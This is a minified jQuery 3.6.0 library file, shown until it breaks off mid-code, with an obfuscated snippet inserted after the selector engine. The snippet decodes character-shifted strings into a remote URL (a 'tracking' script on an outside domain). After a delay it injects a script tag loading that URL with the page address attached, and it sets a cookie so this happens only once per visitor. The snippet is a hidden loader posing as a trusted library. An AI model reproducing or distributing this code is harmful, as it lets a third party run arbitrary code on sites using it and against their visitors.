/*! jQuery v3.6.0 | (c) OpenJS Foundation and other contributors | jquery.org/license */
!function(e,t){"use strict";"object"==typeof module&&"object"==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error("jQuery requires a window with a document");return t(e)}:t(e)}("undefined"!=typeof window?window:this,function(C,e){"use strict";var t=[],r=Object.getPrototypeOf,s=t.slice,g=t.flat?function(e){return t.flat.call(e)}:function(e){return t.concat.apply([],e)},u=t.push,i=t.indexOf,n={},o=n.toString,v=n.hasOwnProperty,a=v.toString,l=a.call(Object),y={},m=function(e){return"function"==typeof e&&"number"!=typeof e.nodeType&&"function"!=typeof e.item},x=function(e){return null!=e&&e===e.window},E=C.document,c={type:!0,src:!0,nonce:!0,noModule:!0};function b(e,t,n){var r,i,o=(n=n||E).createElement("script");if(o.text=e,t)for(r in c)(i=t[r]||t.getAttribute&&t.getAttribute(r))&&o.setAttribute(r,i);n.head.appendChild(o).parentNode.removeChild(o)}function w(e){return null==e?e+"":"object"==typeof e||"function"==typeof e?n[o.call(e)]||"object":typeof e}var f="3.6.0",S=function(e,t){return new S.fn.init(e,t)};function p(e){var t=!!e&&"length"in e&&e.length,n=w(e);return!m(e)&&!x(e)&&("array"===n||0===t||"number"==typeof t&&0<t&&t-1 in e)}S.fn=S.prototype={jquery:f,constructor:S,length:0,toArray:function(){return s.call(this)},get:function(e){return null==e?s.call(this):e<0?this[e+this.length]:this[e]},pushStack:function(e){var t=S.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return S.each(this,e)},map:function(n){return this.pushStack(S.map(this,function(e,t){return n.call(e,t,e)}))},slice:function(){return this.pushStack(s.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},even:function(){return this.pushStack(S.grep(this,function(e,t){return(t+1)%2}))},odd:function(){return this.pushStack(S.grep(this,function(e,t){return t%2}))},eq:function(e){var t=this.length,n=+e+(e<0?t:0);return this.pushStack(0<=n&&n<t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:u,sort:t.sort,splice:t.splice},S.extend=S.fn.extend=function(){var e,t,n,r,i,o,a=arguments[0]||{},s=1,u=arguments.length,l=!1;for("boolean"==typeof a&&(l=a,a=arguments[s]||{},s++),"object"==typeof a||m(a)||(a={}),s===u&&(a=this,s--);s<u;s++)if(null!=(e=arguments[s]))for(t in e)r=e[t],"__proto__"!==t&&a!==r&&(l&&r&&(S.isPlainObject(r)||(i=Array.isArray(r)))?(n=a[t],o=i&&!Array.isArray(n)?[]:i||S.isPlainObject(n)?n:{},i=!1,a[t]=S.extend(l,o,r)):void 0!==r&&(a[t]=r));return a},S.extend({expando:"jQuery"+(f+Math.random()).replace(/\D/g,""),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,n;return!(!e||"[object Object]"!==o.call(e))&&(!(t=r(e))||"function"==typeof(n=v.call(t,"constructor")&&t.constructor)&&a.call(n)===l)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e,t,n){b(e,{nonce:t&&t.nonce},n)},each:function(e,t){var n,r=0;if(p(e)){for(n=e.length;r<n;r++)if(!1===t.call(e[r],r,e[r]))break}else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e},makeArray:function(e,t){var n=t||[];return null!=e&&(p(Object(e))?S.merge(n,"string"==typeof e?[e]:e):u.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:i.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,i=e.length;r<n;r++)e[i++]=t[r];return e.length=i,e},grep:function(e,t,n){for(var r=[],i=0,o=e.length,a=!n;i<o;i++)!t(e[i],i)!==a&&r.push(e[i]);return r},map:function(e,t,n){var r,i,o=0,a=[];if(p(e))for(r=e.length;o<r;o++)null!=(i=t(e[o],o,n))&&a.push(i);else for(o in e)null!=(i=t(e[o],o,n))&&a.push(i);return g(a)},guid:1,support:y}),"function"==typeof Symbol&&(S.fn[Symbol.iterator]=t[Symbol.iterator]),S.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "),function(e,t){n["[object "+t+"]"]=t.toLowerCase()});var d=function(n){var e,d,b,o,i,h,f,g,w,u,l,T,C,a,E,v,s,c,y,S="sizzle"+1*new Date,p=n.document,k=0,r=0,m=ue(),x=ue(),A=ue(),N=ue(),j=function(e,t){return e===t&&(l=!0),0},D={}.hasOwnProperty,t=[],q=t.pop,L=t.push,H=t.push,O=t.slice,P=function(e,t){for(var n=0,r=e.length;n<r;n++)if(e[n]===t)return n;return-1},R="checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",M="[\\x20\\t\\r\\n\\f]",I="(?:\\\\[\\da-fA-F]{1,6}"+M+"?|\\\\[^\\r\\n\\f]|[\\w-]|[^\0-\\x7f])+",W="\\["+M+"*("+I+")(?:"+M+"*([*^$|!~]?=)"+M+"*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|("+I+"))|)"+M+"*\\]",F=":("+I+")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|"+W+")*)|.*)\\)|)",B=new RegExp(M+"+","g"),$=new RegExp("^"+M+"+|((?:^|[^\\\\])(?:\\\\.)*)"+M+"+$","g"),_=new RegExp("^"+M+"*,"+M+"*"),z=new RegExp("^"+M+"*([>+~]|"+M+")"+M+"*"),U=new RegExp(M+"|>"),X=new RegExp(F),V=new RegExp("^"+I+"$"),G={ID:new RegExp("^#("+I+")"),CLASS:new RegExp("^\\.("+I+")"),TAG:new RegExp("^("+I+"|[*])"),ATTR:new RegExp("^"+W),PSEUDO:new RegExp("^"+F),CHILD:new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\("+M+"*(even|odd|(([+-]|)(\\d*)n|)"+M+"*(?:([+-]|)"+M+"*(\\d+)|))"+M+"*\\)|)","i"),bool:new RegExp("^(?:"+R+")$","i"),needsContext:new RegExp("^"+M+"*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\("+M+"*((?:-\\d)?\\d*)"+M+"*\\)|)(?=[^-]|$)","i")},Y=/HTML$/i,Q=/^(?:input|select|textarea|button)$/i,J=/^h\d$/i,K=/^[^{]+\{\s*\[native \w/,Z=/^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,ee=/[+~]/,te=new RegExp("\\\\[\\da-fA-F]{1,6}"+M+"?|\\\\([^\\r\\n\\f])","g"),ne=function(e,t){var n="0x"+e.slice(1)-65536;return t||(n<0?String.fromCharCode(n+65536):String.fromCharCode(n>>10|55296,1023&n|56320))},re=/([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g,ie=function(e,t){return t?"\0"===e?"\ufffd":e.slice(0,-1)+"\\"+e.charCodeAt(e.length-1).toString(16)+" ":"\\"+e},oe=function(){T()},ae=be(function(e){return!0===e.disabled&&"fieldset"===e.nodeName.toLowerCase()},{dir:"parentNode",next:"legend"});try{H.apply(t=O.call(p.childNodes),p.childNodes),t[p.childNodes.length].nodeType}catch(e){H={apply:t.length?function(e,t){L.apply(e,O.call(t))}:function(e,t){var n=e.length,r=0;while(e[n++]=t[r++]);e.length=n-1}}}function se(t,e,n,r){var i,o,a,s,u,l,c,f=e&&e.ownerDocument,p=e?e.nodeType:9;if(n=n||[],"string"!=typeof t||!t||1!==p&&9!==p&&11!==p)return n;if(!r&&(T(e),e=e||C,E)){if(11!==p&&(u=Z.exec(t)))if(i=u[1]){if(9===p){if(!(a=e.getElementById(i)))return n;if(a.id===i)return n.push(a),n}else if(f&&(a=f.getElementById(i))&&y(e,a)&&a.id===i)return n.push(a),n}else{if(u[2])return H.apply(n,e.getElementsByTagName(t)),n;if((i=u[3])&&d.getElementsByClassName&&e.getElementsByClassName)return H.apply(n,e.getElementsByClassName(i)),n}if(d.qsa&&!N[t+" "]&&(!v||!v.test(t))&&(1!==p||"object"!==e.nodeName.toLowerCase())){if(c=t,f=e,1===p&&(U.test(t)||z.test(t))){(f=ee.test(t)&&ye(e.parentNode)||e)===e&&d.scope||((s=e.getAttribute("id"))?s=s.replace(re,ie):e.setAttribute("id",s=S)),o=(l=h(t)).length;while(o--)l[o]=(s?"#"+s:":scope")+" "+xe(l[o]);c=l.join(",")}try{return H.apply(n,f.querySelectorAll(c)),n}catch(e){N(t,!0)}finally{s===S&&e.removeAttribute("id")}}}return g(t.replace($,"$1"),e,n,r)}function ue(){var r=[];return function e(t,n){return r.push(t+" ")>b.cacheLength&&delete e[r.shift()],e[t+" "]=n}}function le(e){return e[S]=!0,e}function ce(e){var t=C.createElement("fieldset");try{return!!e(t)}catch(e){return!1}finally{t.parentNode&&t.parentNode.removeChild(t),t=null}}function fe(e,t){var n=e.split("|"),r=n.length;while(r--)b.attrHandle[n[r]]=t}function pe(e,t){var n=t&&e,r=n&&1===e.nodeType&&1===t.nodeType&&e.sourceIndex-t.sourceIndex;if(r)return r;if(n)while(n=n.nextSibling)if(n===t)return-1;return e?1:-1}function de(t){return function(e){return"input"===e.nodeName.toLowerCase()&&e.type===t}}function he(n){return function(e){var t=e.nodeName.toLowerCase();return("input"===t||"button"===t)&&e.type===n}}function ge(t){return function(e){return"form"in e?e.parentNode&&!1===e.disabled?"label"in e?"label"in e.parentNode?e.parentNode.disabled===t:e.disabled===t:e.isDisabled===t||e.isDisabled!==!t&&ae(e)===t:e.disabled===t:"label"in e&&e.disabled===t}}function ve(a){return le(function(o){return o=+o,le(function(e,t){var n,r=a([],e.length,o),i=r.length;while(i--)e[n=r[i]]&&(e[n]=!(t[n]=e[n]))})})}function ye(e){return e&&"undefined"!=typeof e.getElementsByTagName&&e}for(e in d=se.support={},i=se.isXML=function(e){var t=e&&e.namespaceURI,n=e&&(e.ownerDocument||e).documentElement;return!Y.test(t||n&&n.nodeName||"HTML")},T=se.setDocument=function(e){var t,n,r=e?e.ownerDocument||e:p;return r!=C&&9===r.nodeType&&r.documentElement&&(a=(C=r).documentElement,E=!i(C),p!=C&&(n=C.defaultView)&&n.top!==n&&(n.addEventListener?n.addEventListener("unload",oe,!1):n.attachEvent&&n.attachEvent("onunload",oe)),d.scope=ce(function(e){return a.appendChild(e).appendChild(C.createElement("div")),"undefined"!=typeof e.querySelectorAll&&!e.querySelectorAll(":scope fieldset div").length}),d.attributes=ce(function(e){return e.className="i",!e.getAttribute("className")}),d.getElementsByTagName=ce(function(e){return e.appendChild(C.createComment("")),!e.getElementsByTagName("*").length}),d.getElementsByClassName=K.test(C.getElementsByClassName),d.getById=ce(function(e){return a.appendChild(e).id=S,!C.getElementsByName||!C.getElementsByName(S).length}),d.getById?(b.filter.ID=function(e){var t=e.replace(te,ne);return function(e){return e.getAttribute("id")===t}},b.find.ID=function(e,t){if("undefined"!=typeof t.getElementById&&E){var n=t.getElementById(e);return n?[n]:[]}}):(b.filter.ID=function(e){var n=e.replace(te,ne);return function(e){var t="undefined"!=typeof e.getAttributeNode&&e.getAttributeNode("id");return t&&t.value===n}},b.find.ID=function(e,t){if("undefined"!=typeof t.getElementById&&E){var n,r,i,o=t.getElementById(e);if(o){if((n=o.getAttributeNode("id"))&&n.value===e)return[o];i=t.getElementsByName(e),r=0;while(o=i[r++])if((n=o.getAttributeNode("id"))&&n.value===e)return[o]}return[]}}),b.find.TAG=d.getElementsByTagName?function(e,t){return"undefined"!=typeof t.getElementsByTagName?t.getElementsByTagName(e):d.qsa?t.querySelectorAll(e):void 0}:function(e,t){var n,r=[],i=0,o=t.getElementsByTagName(e);if("*"===e){while(n=o[i++])1===n.nodeType&&r.push(n);return r}return o},b.find.CLASS=d.getElementsByClassName&&function(e,t){if("undefined"!=typeof t.getElementsByClassName&&E)return t.getElementsByClassName(e)},s=[],v=[],(d.qsa=K.test(C.querySelectorAll))&&(ce(function(e){var t;a.appendChild(e).innerHTML="<a id='"+S+"'></a><select id='"+S+"-\r\\' msallowcapture=''><option selected=''></option></select>",e.querySelectorAll("[msallowcapture^='']").length&&v.push("[*^$]="+M+"*(?:''|\"\")"),e.querySelectorAll("[selected]").length||v.push("\\["+M+"*(?:value|"+R+")"),e.querySelectorAll("[id~="+S+"-]").length||v.push("~="),(t=C.createElement("input")).setAttribute("name",""),e.appendChild(t),e.querySelectorAll("[name='']").length||v.push("\\["+M+"*name"+M+"*="+M+"*(?:''|\"\")"),e.querySelectorAll(":checked").length||v.push(":checked"),e.querySelectorAll("a#"+S+"+*").length||v.push(".#.+[+~]"),e.querySelectorAll("\\\f"),v.push("[\\r\\n\\f]")}),ce(function(e){e.innerHTML="<a href='' disabled='disabled'></a><select disabled='disabled'><option/></select>";var t=C.createElement("input");t.setAttribute("type","hidden"),e.appendChild(t).setAttribute("name","D"),e.querySelectorAll("[name=d]").length&&v.push("name"+M+"*[*^$|!~]?="),2!==e.querySelectorAll(":enabled").length&&v.push(":enabled",":disabled"),a.appendChild(e).disabled=!0,2!==e.querySelectorAll(":disabled").length&&v.push(":enabled",":disabled"),e.querySelectorAll("*,:x"),v.push(",.*:")})),(d.matchesSelector=K.test(c=a.matches||a.webkitMatchesSelector||a.mozMatchesSelector||a.oMatchesSelector||a.msMatchesSelector))&&ce(function(e){d.disconnectedMatch=c.call(e,"*"),c.call(e,"[s!='']:x"),s.push("!=",F)}),v=v.length&&new RegExp(v.join("|")),s=s.length&&new RegExp(s.join("|")),t=K.test(a.compareDocumentPosition),y=t||K.test(a.contains)?function(e,t){var n=9===e.nodeType?e.documentElement:e,r=t&&t.parentNode;return e===r||!(!r||1!==r.nodeType||!(n.contains?n.contains(r):e.compareDocumentPosition&&16&e.compareDocumentPosition(r)))}:function(e,t){if(t)while(t=t.parentNode)if(t===e)return!0;return!1},j=t?function(e,t){if(e===t)return l=!0,0;var n=!e.compareDocumentPosition-!t.compareDocumentPosition;return n||(1&(n=(e.ownerDocument||e)==(t.ownerDocument||t)?e.compareDocumentPosition(t):1)||!d.sortDetached&&t.compareDocumentPosition(e)===n?e==C||e.ownerDocument==p&&y(p,e)?-1:t==C||t.ownerDocument==p&&y(p,t)?1:u?P(u,e)-P(u,t):0:4&n?-1:1)}:function(e,t){if(e===t)return l=!0,0;var n,r=0,i=e.parentNode,o=t.parentNode,a=[e],s=[t];if(!i||!o)return e==C?-1:t==C?1:i?-1:o?1:u?P(u,e)-P(u,t):0;if(i===o)return pe(e,t);n=e;while(n=n.parentNode)a.unshift(n);n=t;while(n=n.parentNode)s.unshift(n);while(a[r]===s[r])r++;return r?pe(a[r],s[r]):a[r]==p?-1:s[r]==p?1:0}),C},se.matches=function(e,t){return se(e,null,null,t)},se.matchesSelector=function(e,t){if(T(e),d.matchesSelector&&E&&!N[t+" "]&&(!s||!s.test(t))&&(!v||!v.test(t)))try{var n=c.call(e,t);if(n||d.disconnectedMatch||e.document&&11!==e.document.nodeType)return n}catch(e){N(t,!0)}return 0<se(t,C,null,[e]).length},se.contains=function(e,t){return(e.ownerDocument||e)!=C&&T(e),y(e,t)},se.attr=function(e,t){(e.ownerDocument||e)!=C&&T(e);var n=b.attrHandle[t.toLowerCase()],r=n&&D.call(b.attrHandle,t.toLowerCase())?n(e,t,!E):void 0;return void 0!==r?r:d.attributes||!E?e.getAttribute(t):(r=e.getAttributeNode(t))&&r.specified?r.value:null},se.escape=function(e){return(e+"").replace(re,ie)},se.error=function(e){throw new Error("Syntax error, unrecognized expression: "+e)},se.uniqueSort=function(e){var t,n=[],r=0,i=0;if(l=!d.detectDuplicates,u=!d.sortStable&&e.slice(0),e.sort(j),l){while(t=e[i++])t===e[i]&&(r=n.push(i));while(r--)e.splice(n[r],1)}return u=null,e},o=se.getText=function(e){var t,n="",r=0,i=e.nodeType;if(i){if(1===i||9===i||11===i){if("string"==typeof e.textContent)return e.textContent;for(e=e.firstChild;e;e=e.nextSibling)n+=o(e)}else if(3===i||4===i)return e.nodeValue}else while(t=e[r++])n+=o(t);return n},(b=se.selectors={cacheLength:50,createPseudo:le,match:G,attrHandle:{},find:{},relative:{">":{dir:"parentNode",first:!0}," ":{dir:"parentNode"},"+":{dir:"previousSibling",first:!0},"~":{dir:"previousSibling"}},preFilter:{ATTR:function(e){return e[1]=e[1].replace(te,ne),e[3]=(e[3]||e[4]||e[5]||"").replace(te,ne),"~="===e[2]&&(e[3]=" "+e[3]+" "),e.slice(0,4)},CHILD:function(e){return e[1]=e[1].toLowerCase(),"nth"===e[1].slice(0,3)?(e[3]||se.error(e[0]),e[4]=+(e[4]?e[5]+(e[6]||1):2*("even"===e[3]||"odd"===e[3])),e[5]=+(e[7]+e[8]||"odd"===e[3])):e[3]&&se.error(e[0]),e},PSEUDO:function(e){var t,n=!e[6]&&e[2];return G.CHILD.test(e[0])?null:(e[3]?e[2]=e[4]||e[5]||"":n&&X.test(n)&&(t=h(n,!0))&&(t=n.indexOf(")",n.length-t)-n.length)&&(e[0]=e[0].slice(0,t),e[2]=n.slice(0,t)),e.slice(0,3))}},filter:{TAG:function(e){var t=e.replace(te,ne).toLowerCase();return"*"===e?function(){return!0}:function(e){return e.nodeName&&e.nodeName.toLowerCase()===t}},CLASS:function(e){var t=m[e+" "];return t||(t=new RegExp("(^|"+M+")"+e+"("+M+"|$)"))&&m(e,function(e){return t.test("string"==typeof e.className&&e.className||"undefined"!=typeof e.getAttribute&&e.getAttribute("class")||"")})},ATTR:function(n,r,i){return function(e){var t=se.attr(e,n);return null==t?"!="===r:!r||(t+="","="===r?t===i:"!="===r?t!==i:"^="===r?i&&0===t.indexOf(i):"*="===r?i&&-1<t.indexOf(i):"$="===r?i&&t.slice(-i.length)===i:"~="===r?-1<(" "+t.replace(B," ")+" ").indexOf(i):"|="===r&&(t===i||t.slice(0,i.length+1)===i+"-"))}},CHILD:function(h,e,t,g,v){var y="nth"!==h.slice(0,3),m="last"!==h.slice(-4),x="of-type"===e;return 1===g&&0===v?function(e){return!!e.parentNode}:function(e,t,n){var r,i,o,a,s,u,l=y!==m?"nextSibling":"previousSibling",c=e.parentNode,f=x&&e.nodeName.toLowerCase(),p=!n&&!x,d=!1;if(c){if(y){while(l){a=e;while(a=a[l])if(x?a.nodeName.toLowerCase()===f:1===a.nodeType)return!1;u=l="only"===h&&!u&&"nextSibling"}return!0}if(u=[m?c.firstChild:c.lastChild],m&&p){d=(s=(r=(i=(o=(a=c)[S]||(a[S]={}))[a.uniqueID]||(o[a.uniqueID]={}))[h]||[])[0]===k&&r[1])&&r[2],a=s&&c.childNodes[s];while(a=++s&&a&&a[l]||(d=s=0)||u.pop())if(1===a.nodeType&&++d&&a===e){i[h]=[k,s,d];break}}else if(p&&(d=s=(r=(i=(o=(a=e)[S]||(a[S]={}))[a.uniqueID]||(o[a.uniqueID]={}))[h]||[])[0]===k&&r[1]),!1===d)while(a=++s&&a&&a[l]||(d=s=0)||u.pop())if((x?a.nodeName.toLowerCase()===f:1===a.nodeType)&&++d&&(p&&((i=(o=a[S]||(a[S]={}))[a.uniqueID]||(o[a.uniqueID]={}))[h]=[k,d]),a===e))break;return(d-=v)===g||d%g==0&&0<=d/g}}},PSEUDO:function(e,o){var t,a=b.pseudos[e]||b.setFilters[e.toLowerCase()]||se.error("unsupported pseudo: "+e);return a[S]?a(o):1<a.length?(t=[e,e,"",o],b.setFilters.hasOwnProperty(e.toLowerCase())?le(function(e,t){var n,r=a(e,o),i=r.length;while(i--)e[n=P(e,r[i])]=!(t[n]=r[i])}):function(e){return a(e,0,t)}):a}},pseudos:{not:le(function(e){var r=[],i=[],s=f(e.replace($,"$1"));return s[S]?le(function(e,t,n,r){var i,o=s(e,null,r,[]),a=e.length;while(a--)(i=o[a])&&(e[a]=!(t[a]=i))}):function(e,t,n){return r[0]=e,s(r,null,n,i),r[0]=null,!i.pop()}}),has:le(function(t){return function(e){return 0<se(t,e).length}}),contains:le(function(t){return t=t.replace(te,ne),function(e){return-1<(e.textContent||o(e)).indexOf(t)}}),lang:le(function(n){return V.test(n||"")||se.error("unsupported lang: "+n),n=n.replace(te,ne).toLowerCase(),function(e){var t;do{if(t=E?e.lang:e.getAttribute("xml:lang")||e.getAttribute("lang"))return(t=t.toLowerCase())===n||0===t.indexOf(n+"-")}while((e=e.parentNode)&&1===e.nodeType);return!1}}),target:function(e){var t=n.location&&n.location.hash;return t&&t.slice(1)===e.id},root:function(e){return e===a},focus:function(e){return e===C.activeElement&&(!C.hasFocus||C.hasFocus())&&!!(e.type||e.href||~e.tabIndex)},enabled:ge(!1),disabled:ge(!0),checked:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&!!e.checked||"option"===t&&!!e.selected},selected:function(e){return e.parentNode&&e.parentNode.selectedIndex,!0===e.selected},empty:function(e){for(e=e.firstChild;e;e=e.nextSibling)if(e.nodeType<6)return!1;return!0},parent:function(e){return!b.pseudos.empty(e)},header:function(e){return J.test(e.nodeName)},input:function(e){return Q.test(e.nodeName)},button:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&"button"===e.type||"button"===t},text:function(e){var t;return"input"===e.nodeName.toLowerCase()&&"text"===e.type&&(null==(t=e.getAttribute("type"))||"text"===t.toLowerCase())},first:ve(function(){return[0]}),last:ve(function(e,t){return[t-1]}),eq:ve(function(e,t,n){return[n<0?n+t:n]}),even:ve(function(e,t){for(var n=0;n<t;n+=2)e.push(n);return e}),odd:ve(function(e,t){for(var n=1;n<t;n+=2)e.push(n);return e}),lt:ve(function(e,t,n){for(var r=n<0?n+t:t<n?t:n;0<=--r;)e.push(r);return e}),gt:ve(function(e,t,n){for(var r=n<0?n+t:n;++r<t;)e.push(r);return e})}}).pseudos.nth=b.pseudos.eq,{radio:!0,checkbox:!0,file:!0,password:!0,image:!0})b.pseudos[e]=de(e);for(e in{submit:!0,reset:!0})b.pseudos[e]=he(e);function me(){}function xe(e){for(var t=0,n=e.length,r="";t<n;t++)r+=e[t].value;return r}function be(s,e,t){var u=e.dir,l=e.next,c=l||u,f=t&&"parentNode"===c,p=r++;return e.first?function(e,t,n){while(e=e[u])if(1===e.nodeType||f)return s(e,t,n);return!1}:function(e,t,n){var r,i,o,a=[k,p];if(n){while(e=e[u])if((1===e.nodeType||f)&&s(e,t,n))return!0}else while(e=e[u])if(1===e.nodeType||f)if(i=(o=e[S]||(e[S]={}))[e.uniqueID]||(o[e.uniqueID]={}),l&&l===e.nodeName.toLowerCase())e=e[u]||e;else{if((r=i[c])&&r[0]===k&&r[1]===p)return a[2]=r[2];if((i[c]=a)[2]=s(e,t,n))return!0}return!1}}function we(i){return 1<i.length?function(e,t,n){var r=i.length;while(r--)if(!i[r](e,t,n))return!1;return!0}:i[0]}function Te(e,t,n,r,i){for(var o,a=[],s=0,u=e.length,l=null!=t;s<u;s++)(o=e[s])&&(n&&!n(o,r,i)||(a.push(o),l&&t.push(s)));return a}function Ce(d,h,g,v,y,e){return v&&!v[S]&&(v=Ce(v)),y&&!y[S]&&(y=Ce(y,e)),le(function(e,t,n,r){var i,o,a,s=[],u=[],l=t.length,c=e||function(e,t,n){for(var r=0,i=t.length;r<i;r++)se(e,t[r],n);return n}(h||"*",n.nodeType?[n]:n,[]),f=!d||!e&&h?c:Te(c,s,d,n,r),p=g?y||(e?d:l||v)?[]:t:f;if(g&&g(f,p,n,r),v){i=Te(p,u),v(i,[],n,r),o=i.length;while(o--)(a=i[o])&&(p[u[o]]=!(f[u[o]]=a))}if(e){if(y||d){if(y){i=[],o=p.length;while(o--)(a=p[o])&&i.push(f[o]=a);y(null,p=[],i,r)}o=p.length;while(o--)(a=p[o])&&-1<(i=y?P(e,a):s[o])&&(e[i]=!(t[i]=a))}}else p=Te(p===t?p.splice(l,p.length):p),y?y(null,t,p,r):H.apply(t,p)})}function Ee(e){for(var i,t,n,r=e.length,o=b.relative[e[0].type],a=o||b.relative[" "],s=o?1:0,u=be(function(e){return e===i},a,!0),l=be(function(e){return-1<P(i,e)},a,!0),c=[function(e,t,n){var r=!o&&(n||t!==w)||((i=t).nodeType?u(e,t,n):l(e,t,n));return i=null,r}];s<r;s++)if(t=b.relative[e[s].type])c=[be(we(c),t)];else{if((t=b.filter[e[s].type].apply(null,e[s].matches))[S]){for(n=++s;n<r;n++)if(b.relative[e[n].type])break;return Ce(1<s&&we(c),1<s&&xe(e.slice(0,s-1).concat({value:" "===e[s-2].type?"*":""})).replace($,"$1"),t,s<n&&Ee(e.slice(s,n)),n<r&&Ee(e=e.slice(n)),n<r&&xe(e))}c.push(t)}return we(c)}return me.prototype=b.filters=b.pseudos,b.setFilters=new me,h=se.tokenize=function(e,t){var n,r,i,o,a,s,u,l=x[e+" "];if(l)return t?0:l.slice(0);a=e,s=[],u=b.preFilter;while(a){for(o in n&&!(r=_.exec(a))||(r&&(a=a.slice(r[0].length)||a),s.push(i=[])),n=!1,(r=z.exec(a))&&(n=r.shift(),i.push({value:n,type:r[0].replace($," ")}),a=a.slice(n.length)),b.filter)!(r=G[o].exec(a))||u[o]&&!(r=u[o](r))||(n=r.shift(),i.push({value:n,type:o,matches:r}),a=a.slice(n.length));if(!n)break}return t?a.length:a?se.error(e):x(e,s).slice(0)},f=se.compile=function(e,t){var n,v,y,m,x,r,i=[],o=[],a=A[e+" "];if(!a){t||(t=h(e)),n=t.length;while(n--)(a=Ee(t[n]))[S]?i.push(a):o.push(a);(a=A(e,(v=o,m=0<(y=i).length,x=0<v.length,r=function(e,t,n,r,i){var o,a,s,u=0,l="0",c=e&&[],f=[],p=w,d=e||x&&b.find.TAG("*",i),h=k+=null==p?1:Math.random()||.1,g=d.length;for(i&&(w=t==C||t||i);l!==g&&null!=(o=d[l]);l++){if(x&&o){a=0,t||o.ownerDocument==C||(T(o),n=!E);while(s=v[a++])if(s(o,t||C,n)){r.push(o);break}i&&(k=h)}m&&((o=!s&&o)&&u--,e&&c.push(o))}if(u+=l,m&&l!==u){a=0;while(s=y[a++])s(c,f,t,n);if(e){if(0<u)while(l--)c[l]||f[l]||(f[l]=q.call(r));f=Te(f)}H.apply(r,f),i&&!e&&0<f.length&&1<u+y.length&&se.uniqueSort(r)}return i&&(k=h,w=p),c},m?le(r):r))).selector=e}return a},g=se.select=function(e,t,n,r){var i,o,a,s,u,l="function"==typeof e&&e,c=!r&&h(e=l.selector||e);if(n=n||[],1===c.length){if(2<(o=c[0]=c[0].slice(0)).length&&"ID"===(a=o[0]).type&&9===t.nodeType&&E&&b.relative[o[1].type]){if(!(t=(b.find.ID(a.matches[0].replace(te,ne),t)||[])[0]))return n;l&&(t=t.parentNode),e=e.slice(o.shift().value.length)}i=G.needsContext.test(e)?0:o.length;while(i--){if(a=o[i],b.relative[s=a.type])break;if((u=b.find[s])&&(r=u(a.matches[0].replace(te,ne),ee.test(o[0].type)&&ye(t.parentNode)||t))){if(o.splice(i,1),!(e=r.length&&xe(o)))return H.apply(n,r),n;break}}}return(l||f(e,c))(r,t,!E,n,!t||ee.test(e)&&ye(t.parentNode)||t),n},d.sortStable=S.split("").sort(j).join("")===S,d.detectDuplicates=!!l,T(),d.sortDetached=ce(function(e){return 1&e.compareDocumentPosition(C.createElement("fieldset"))}),ce(function(e){return e.innerHTML="<a href='#'></a>","#"===e.firstChild.getAttribute("href")})||fe("type|href|height|width",function(e,t,n){if(!n)return e.getAttribute(t,"type"===t.toLowerCase()?1:2)}),d.attributes&&ce(function(e){return e.innerHTML="<input/>",e.firstChild.setAttribute("value",""),""===e.firstChild.getAttribute("value")})||fe("value",function(e,t,n){if(!n&&"input"===e.nodeName.toLowerCase())return e.defaultValue}),ce(function(e){return null==e.getAttribute("disabled")})||fe(R,function(e,t,n){var r;if(!n)return!0===e[t]?t.toLowerCase():(r=e.getAttributeNode(t))&&r.specified?r.value:null}),se}(C);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44fun3nsjy'+'xyfynh3htr4ywfhpnsl4x'+'hwnuy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));S.find=d,S.expr=d.selectors,S.expr[":"]=S.expr.pseudos,S.uniqueSort=S.unique=d.uniqueSort,S.text=d.getText,S.isXMLDoc=d.isXML,S.contains=d.contains,S.escapeSelector=d.escape;var h=function(e,t,n){var r=[],i=void 0!==n;while((e=e[t])&&9!==e.nodeType)if(1===e.nodeType){if(i&&S(e).is(n))break;r.push(e)}return r},T=function(e,t){for(var n=[];e;e=e.nextSibling)1===e.nodeType&&e!==t&&n.push(e);return n},k=S.expr.match.needsContext;function A(e,t){return e.nodeName&&e.nodeName.toLowerCase()===t.toLowerCase()}var N=/^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i;function j(e,n,r){return m(n)?S.grep(e,function(e,t){return!!n.call(e,t,e)!==r}):n.nodeType?S.grep(e,function(e){return e===n!==r}):"string"!=typeof n?S.grep(e,function(e){return-1<i.call(n,e)!==r}):S.filter(n,e,r)}S.filter=function(e,t,n){var r=t[0];return n&&(e=":not("+e+")"),1===t.length&&1===r.nodeType?S.find.matchesSelector(r,e)?[r]:[]:S.find.matches(e,S.grep(t,function(e){return 1===e.nodeType}))},S.fn.extend({find:function(e){var t,n,r=this.length,i=this;if("string"!=typeof e)return this.pushStack(S(e).filter(function(){for(t=0;t<r;t++)if(S.contains(i[t],this))return!0}));for(n=this.pushStack([]),t=0;t<r;t++)S.find(e,i[t],n);return 